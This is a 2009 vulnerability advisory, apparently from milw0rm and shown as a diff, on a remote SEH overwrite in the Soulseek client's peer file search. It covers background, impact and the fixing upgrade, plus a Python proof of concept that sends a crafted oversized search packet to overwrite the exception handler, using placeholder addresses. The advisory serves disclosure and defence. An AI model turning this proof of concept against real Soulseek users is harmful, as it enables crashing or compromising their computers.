@@ -1,0 +1,107 @@
+Soulseek 157 NS < 13e & 156.* Remote Peer Search Code Execution
+=============================================
+- Release date: July 02, 2009
+- Discovered by: Laurent Gaffié ; http://g-laurent.blogspot.com/
+- Severity: critical
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Soulseek 157 NS < 13e & 156.* Remote Peer Search Code Execution
+
+II. BACKGROUND
+-------------------------
+"Soulseek(tm) is a unique ad-free, spyware free, and just plain free file
+sharing application.
+One of the things that makes Soulseek(tm) unique is our community and
+community-related features.
+Based on peer-to-peer technology, virtual rooms allow you to meet people with
+the same interests, share information, and chat freely using real-time messages
+in public or private.
+Soulseek(tm), with its built-in people matching system, is a great way to make
+new friends and expand your mind!"
+
+III. DESCRIPTION
+-------------------------
+Soulseek client allows direct peer file search, allowing a user to find the files he wants directly on the
+peer computer.
+Unfortunatly this feature is vulnerable to a remote SEH overwrite.
+
+IV. PROOF OF CONCEPT
+-------------------------
+This proof of concept will target a user called 123yow123.
+
+import struct
+import sys, socket
+from time import *
+
+ip = "IP_ADDR"
+port = "PORT_NUM" #You can find out, how to find out IP/PORT if you RTFM :)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+ s.connect((ip,port))
+except:
+ print "Can\'t connect to peer!\n"
+ sys.exit(0)
+
+junk = "\x41" * 3084
+next_seh = struct.pack('<L', 0x42424242)
+seh = struct.pack('<L', 0x43434343)
+other_junk = "\x61" * 1424
+
+buffer = "\x17\x00\x00\x00\x01\x09\x00\x00\x00\x31\x32\x33\x79\x6f\x77\x31"
+buffer+= "\x32\x33\x01\x00\x00\x00\x50\x00\x00\x00\x00\x21\x0c\x00\x00\x08"
+buffer+= "\x00\x00\x00\x6c\x7b\x1d\x0c\x15\x0c\x00\x00"+junk+next_seh+seh+other_junk
+
+s.send(buffer)
+
+
+After the query is send, the SEH handler will get overwriten.
+
+
+V. BUSINESS IMPACT
+-------------------------
+An attacker could exploit this vulnerability to compromise any prior to 157 NS 13e Soulseek client
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Windows all versions
+
+VII. SOLUTION
+-------------------------
+Upgrade to 157 NS 13e
+(http://slsknet.org/download.html)
+
+VIII. REFERENCES
+-------------------------
+http://www.slsknet.org
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by Laurent Gaffié
+Laurent.gaffie{remove-this}(at)gmail.com
+
+
+X. REVISION HISTORY
+-------------------------
+july 02, 2009
+
+XI. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is"
+with no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or
+misuse of this information.
+
+XII. PERSONAL NOTES
+------------------------
+Souleek team as patched this bug month ago, a distributed message urging users to upgrade them Soulseek client
+is still send since a month, and not much users still use vulnerable Soulseek versions.
+@to the one who like to rip bugs and make an exploit ""universal"" for fame, just make sure it's at least
+universal before you say so.
+For the others : http://www.youtube.com/watch?v=tVACUjHn6yU   :)
+
+@RIIA : http://www.openp2p.com/pub/a/p2p/2002/12/11/piracy.html 
+
+# milw0rm.com [2009-07-09]
